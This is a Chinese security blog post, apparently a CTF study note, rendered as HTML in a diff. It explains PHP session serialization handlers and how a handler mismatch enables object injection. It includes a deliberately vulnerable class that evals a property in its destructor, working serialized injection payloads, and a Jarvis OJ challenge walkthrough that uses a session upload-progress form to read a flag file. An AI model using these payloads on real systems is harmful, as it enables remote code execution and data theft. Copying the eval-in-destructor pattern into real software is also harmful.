@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="应用场景 一般来说服务器是很少关机重启的，但是有的时候必须需要重启，而用户会话还在进行相应的操作，这时就需要使用序列化 来把这个 session 信息保存起来放在硬盘里，服务器重启后又重新加载。这样保证了用户信息不会丢失，实现永久化保存。 淘宝每年都会有定时抢购的活动，很多用户会提前登录等待，长时间不进行操作，一致保存在内存中，而到达指定时刻，几十万用户并发访问，就可能会有几十万个session，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP Session 的序列化和反序列化">
+<meta property="og:url" content="https://mayi077.github.io/2020/03/08/PHP-Session-%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="应用场景 一般来说服务器是很少关机重启的，但是有的时候必须需要重启，而用户会话还在进行相应的操作，这时就需要使用序列化 来把这个 session 信息保存起来放在硬盘里，服务器重启后又重新加载。这样保证了用户信息不会丢失，实现永久化保存。 淘宝每年都会有定时抢购的活动，很多用户会提前登录等待，长时间不进行操作，一致保存在内存中，而到达指定时刻，几十万用户并发访问，就可能会有几十万个session，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.downk.cc/item/5e64938e98271cb2b85b43fd.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e64980e98271cb2b85da864.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e6499e198271cb2b85e5d14.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e64af9b98271cb2b86640b0.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e64b83798271cb2b869b24f.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e64c80598271cb2b8701792.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e64df1398271cb2b87efcdd.jpg">
+<meta property="article:published_time" content="2020-03-08T12:14:02.000Z">
+<meta property="article:modified_time" content="2021-03-25T14:22:07.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="漏洞积累">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.downk.cc/item/5e64938e98271cb2b85b43fd.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2020/03/08/PHP-Session-%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>PHP Session 的序列化和反序列化 | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/03/08/PHP-Session-%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PHP Session 的序列化和反序列化
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-08 20:14:02" itemprop="dateCreated datePublished" datetime="2020-03-08T20:14:02+08:00">2020-03-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-25 22:22:07" itemprop="dateModified" datetime="2021-03-25T22:22:07+08:00">2021-03-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%97%A5%E5%B8%B8%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">日常笔记</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>14 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ol>
+<li>一般来说服务器是很少关机重启的，但是有的时候必须需要重启，而用户会话还在进行相应的操作，这时就需要<strong>使用序列化</strong> 来把这个 session 信息保存起来放在硬盘里，服务器重启后又重新加载。这样保证了用户信息不会丢失，实现永久化保存。</li>
+<li>淘宝每年都会有定时抢购的活动，很多用户会提前登录等待，长时间不进行操作，一致保存在内存中，而到达指定时刻，几十万用户并发访问，就可能会有几十万个session，内存可能吃不消，这时就需要进行对象的活化、钝化，让其在闲置的时候离开内存，将信息保存至硬盘，等要用的时候，就重新加载进内存<br><a href="https://blog.csdn.net/qq_27886997/article/details/78302747" target="_blank" rel="noopener">【参考链接】</a>  </li>
+</ol>
+<h3 id="PHP-反序列化与-Session"><a href="#PHP-反序列化与-Session" class="headerlink" title="PHP 反序列化与 Session"></a>PHP 反序列化与 Session</h3><h4 id="PHP-session-序列化机制"><a href="#PHP-session-序列化机制" class="headerlink" title="PHP session 序列化机制"></a>PHP session 序列化机制</h4><p>&emsp;当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）。 </p>
+<h4 id="session-序列化及反序列化处理器"><a href="#session-序列化及反序列化处理器" class="headerlink" title="session 序列化及反序列化处理器"></a>session 序列化及反序列化处理器</h4><p>&emsp; PHP 内置了一些处理器用于对 session 数据进行序列化及反序列化，常见的有以下三种：</p>
+<ul>
+<li><strong>php</strong> 对应的存储格式为 <code>键名 + | + 经过 serialize 序列化处理的值</code>。</li>
+<li><strong>php_binary</strong> 对应的存储格式为 <code>键名长度对应的ASCII字符+ 键名 + 经过serialize 序列化的值</code>。</li>
+<li><strong>php_serialize</strong> (php&gt;=5.5) 对应的存储格式为  <code>经过 serialize 序列化的值</code>  <h4 id="与-session-相关的配置项"><a href="#与-session-相关的配置项" class="headerlink" title="与 session 相关的配置项"></a>与 session 相关的配置项</h4>&emsp;session 配置项有很多可选的，这里我只学习我们利用需要用到的。</li>
+</ul>
+<ol>
+<li>session.auto_start 表示是否自动启用 session 相关机制( <strong>如果改它需要重启服务器</strong> )，如果自动启动可以不用 session_start() 来调用。(可以不用尝试在代码里改它了) </li>
+<li>session.save_path 表明了，这个序列化文件存放在哪。</li>
+<li>session.serialize_handler 定义用什么序列化/反序列化处理器<h4 id="几种-处理器-的区别"><a href="#几种-处理器-的区别" class="headerlink" title="几种 处理器 的区别"></a>几种 处理器 的区别</h4><h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5>使用 代码如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;session.serialize_handler&quot;,&quot;php&quot;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;a&quot;]&#x3D;array(&quot;1&quot;&#x3D;&gt;&quot;a&quot;,&quot;2&quot;&#x3D;&gt;&quot;b&quot;);</span><br><span class="line">$_SESSION[&quot;b&quot;]&#x3D;&quot;start&quot;;</span><br><span class="line">echo &quot;success,serialize_handler is php!&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+得到的结果是<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a|a:2:&#123;i:1;s:1:&quot;a&quot;;i:2;s:1:&quot;b&quot;;&#125;b|s:5:&quot;start&quot;; </span><br><span class="line">可以看出是 键名+| + 序列化后的值</span><br></pre></td></tr></table></figure>
+<a href="https://pic.downk.cc/item/5e64938e98271cb2b85b43fd.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e64938e98271cb2b85b43fd.jpg" alt=""></a></li>
+</ol>
+<h5 id="php-binary-处理器"><a href="#php-binary-处理器" class="headerlink" title="php_binary 处理器"></a>php_binary 处理器</h5><p>使用代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;session.serialize_handler&quot;,&quot;php_binary&quot;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;a&quot;]&#x3D;array(&quot;1&quot;&#x3D;&gt;&quot;1a&quot;,&quot;2&quot;&#x3D;&gt;&quot;2b&quot;);</span><br><span class="line">$_SESSION[&quot;b&quot;]&#x3D;&quot;start&quot;;</span><br><span class="line">echo &quot;success,serialize_handler is php_binary !&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到的结果是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">？aa:2:&#123;i:1;s:2:&quot;1a&quot;;i:2;s:2:&quot;2b&quot;;&#125;？bs:5:&quot;start&quot;;  </span><br><span class="line">键的位数的ASCII编码 + 键名 + 值的序列化</span><br></pre></td></tr></table></figure>
+<p><a href="https://pic.downk.cc/item/5e64980e98271cb2b85da864.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e64980e98271cb2b85da864.jpg" alt=""></a></p>
+<h5 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h5><p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;session.serialize_handler&quot;,&quot;php_serialize&quot;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;a&quot;]&#x3D;array(&quot;1&quot;&#x3D;&gt;&quot;1a&quot;,&quot;2&quot;&#x3D;&gt;&quot;2b&quot;);</span><br><span class="line">$_SESSION[&quot;b&quot;]&#x3D;&quot;start&quot;;</span><br><span class="line">echo &quot;success,serialize_handler is php_serialize !&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>结果存储的值为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:1:&quot;a&quot;;a:2:&#123;i:1;s:2:&quot;1a&quot;;i:2;s:2:&quot;2b&quot;;&#125;s:1:&quot;b&quot;;s:5:&quot;start&quot;;&#125; </span><br><span class="line">将整个数组序列化后的值</span><br></pre></td></tr></table></figure>
+<p><a href="https://pic.downk.cc/item/5e6499e198271cb2b85e5d14.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e6499e198271cb2b85e5d14.jpg" alt=""></a> </p>
+<h4 id="PHP-Session-中序列化的危害"><a href="#PHP-Session-中序列化的危害" class="headerlink" title="PHP Session 中序列化的危害"></a>PHP Session 中序列化的危害</h4><p>&emsp;PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。<br>如果在PHP在序列化存储的$_SESSION数据时使用的处理器和反序列化使用的处理器不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。  </p>
+<h5 id="举个简单的例子"><a href="#举个简单的例子" class="headerlink" title="举个简单的例子"></a>举个简单的例子</h5><p>test_1.php 内容为下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&quot;mayi&quot;]&#x3D;$_GET[&quot;a&quot;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>test_2.php 内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;session.serialize_handler&quot;,&quot;php&quot;);</span><br><span class="line">session_start();</span><br><span class="line">class lemon &#123;</span><br><span class="line">	var $hi;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;hi&#x3D;&#39;phpinfo();&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function  __destruct()&#123;</span><br><span class="line">		eval($this-&gt;hi);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;new lemon(); 值得注意的是，通过session 反序列化的对象会在它后面摧毁，也就是说出现在它后面</span><br><span class="line">。</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们先在test_1.php 中传入<code>?a=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:15:&quot;echo &quot;success&quot;;&quot;;}</code> 那么，session文件里的内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;mayi&quot;;s:49:&quot;|O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:15:&quot;echo &quot;success&quot;;&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后我们在访问 test_2.php 可以猜想到因为处理器的不同，对session的理解也会不同，php处理器 把 <code>|</code> 前面的理解为键名。也就是说<code>a:1:{s:4:&quot;mayi&quot;;s:49:&quot;</code>成为了键名(以前的键名是<code>a</code>)，然后剩余部分经过反序列化后变成键值，也就是<code>O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:15:&quot;echo &quot;success&quot;;&quot;;}&quot;;}</code> 值的注意的是后面的<code>&quot;;}</code> 会被忽略掉。那么这样我们就可以达到任意命令执行的效果啦！  </p>
+<ol>
+<li>访问，<code>test_1.php?a=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:15:&quot;echo &quot;success&quot;;&quot;;}</code> </li>
+<li>访问 <code>/test_2.php</code><br><a href="https://pic.downk.cc/item/5e64af9b98271cb2b86640b0.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e64af9b98271cb2b86640b0.jpg" alt=""></a>   </li>
+</ol>
+<h3 id="再来看看一道-ctf-的题目"><a href="#再来看看一道-ctf-的题目" class="headerlink" title="再来看看一道 ctf 的题目"></a>再来看看一道 ctf 的题目</h3><p>  题目链接：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a><br>  题目给了我们源码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;A webshell is wait for you</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz &#x3D; &#39;phpinfo();&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;phpinfo&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m &#x3D; new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&#39;index.php&#39;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;看到设置了 session.serialize_handler 为 php 极大的可能是 Session 反序列利用</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>查看 phpinfo信息，发现全局用的php_serialize进行序列化，而这个页面是以php来进行解析的。那么理论上讲是可以准备$this-&gt;mdzz = ‘payload’;来进行攻击。<br><a href="https://pic.downk.cc/item/5e64b83798271cb2b869b24f.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e64b83798271cb2b869b24f.jpg" alt=""></a> </li>
+<li>但是我们怎么将 payload 写入session全局变量呢？这里有一个技巧，php文件上传时会将<strong>文件名</strong>写入session。需要满足以下条件：<a href="https://bugs.php.net/bug.php?id=71101" target="_blank" rel="noopener">【参考链接】</a></li>
+</ol>
+<ul>
+<li>session.upload_progress.enabled = On</li>
+<li>上传一个字段的属性名和session.upload_progress.name的值相等，这里根据上面的phpinfo信息看得出。  </li>
+</ul>
+<ol start="3">
+<li><p>写脚本传session值给 目标网站，需要注意的是注意这里 <strong>“PHP_SESSION_UPLOAD_PROGRESS” 的 value不能为空</strong> 也就是这个项的值不能为空，脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;upload&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;1&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&#x2F;&#x2F;记得是以POST方法传过去</span><br><span class="line">&#x2F;&#x2F;其中hidden 是隐藏的文本输入框，用文本框（text）也可以</span><br></pre></td></tr></table></figure>
+<p>结果如下<br><a href="https://pic.downk.cc/item/5e64c80598271cb2b8701792.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e64c80598271cb2b8701792.jpg" alt=""></a>   </p>
+</li>
+<li><p>最后将文件名改为<code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:89:\&quot;var_dump(file_get_contents(&#39;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&#39;));\&quot;;}</code>得到flag<br><a href="https://pic.downk.cc/item/5e64df1398271cb2b87efcdd.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e64df1398271cb2b87efcdd.jpg" alt=""></a>  </p>
+</li>
+</ol>
+<p><strong>有一个疑惑：</strong> 为什么不可以把 name=”PHP_SESSION_UPLOAD_PROGRESS”; 这个项直接写在 file 那里面？ </p>
+<p>参考链接：<br><a href="https://www.mi1k7ea.com/2019/04/21/PHP-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-%E5%8F%82%E8%80%83" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/04/21/PHP-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-%E5%8F%82%E8%80%83</a><br><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a><br><a href="https://www.cnblogs.com/sijidou/p/10455646.html" target="_blank" rel="noopener">https://www.cnblogs.com/sijidou/p/10455646.html</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2020/03/08/PHP-Session-%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP Session 的序列化和反序列化">https://mayi077.github.io/2020/03/08/PHP-Session-的序列化和反序列化/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E7%A7%AF%E7%B4%AF/" rel="tag"><i class="fa fa-tag"></i>漏洞积累</a>
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i>笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/06/githacker-%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/" rel="prev" title="githacker 及使用时遇到的问题">
+      <i class="fa fa-chevron-left"></i> githacker 及使用时遇到的问题
+    </a></div>
+      <div class="post-nav-item">
